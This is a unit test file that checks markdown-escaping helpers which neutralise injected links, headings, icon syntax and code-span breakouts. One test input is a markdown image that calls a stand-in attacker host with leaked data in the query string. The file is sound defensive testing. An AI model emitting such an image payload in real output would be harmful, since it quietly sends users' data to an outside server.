import { describe, expect, it } from 'vitest';
import { codeSpan, escapeMarkdown, markdownLinkDestination } from '../src/system/markdown';

describe('escapeMarkdown', () => {
  it('neutralises an image that would load a remote URL', () => {
    expect(escapeMarkdown('![](https://attacker.example/b.png?u=leak)')).toBe(
      '\\!\\[\\]\\(https://attacker\\.example/b\\.png?u=leak\\)',
    );
  });

  it('neutralises a link', () => {
    expect(escapeMarkdown('[text](https://evil.example)')).toBe(
      '\\[text\\]\\(https://evil\\.example\\)',
    );
  });

  it('collapses line breaks so an author name cannot open a heading', () => {
    expect(escapeMarkdown('Bob**\n\n# Heading')).toBe('Bob\\*\\* \\# Heading');
  });

  it('neutralises the theme-icon syntax', () => {
    expect(escapeMarkdown('$(alert) now')).toBe('$\\(alert\\) now');
  });

  it('escapes emphasis, html and entities', () => {
    expect(escapeMarkdown('a_b <img> &amp;')).toBe('a\\_b \\<img\\> \\&amp;');
  });

  it('leaves ordinary text alone', () => {
    expect(escapeMarkdown('Fix the parser')).toBe('Fix the parser');
  });
});

describe('codeSpan', () => {
  it('wraps plain text in single backticks', () => {
    expect(codeSpan('src/main.ts')).toBe('`src/main.ts`');
  });

  it('lengthens the fence past the longest backtick run', () => {
    expect(codeSpan('a`b``c')).toBe('```a`b``c```');
  });

  it('pads when the text starts or ends with a backtick', () => {
    expect(codeSpan('`x`')).toBe('`` `x` ``');
  });

  it('collapses line breaks that would end the code span', () => {
    expect(codeSpan('a\n\nb')).toBe('`a b`');
  });
});

describe('markdownLinkDestination', () => {
  it('wraps the URL so spaces and parentheses stay inside it', () => {
    expect(markdownLinkDestination('https://x.example/a (b)')).toBe(
      '<https://x.example/a (b)>',
    );
  });

  it('encodes the characters that would close the destination', () => {
    expect(markdownLinkDestination('https://x.example/<>')).toBe(
      '<https://x.example/%3C%3E>',
    );
  });
});
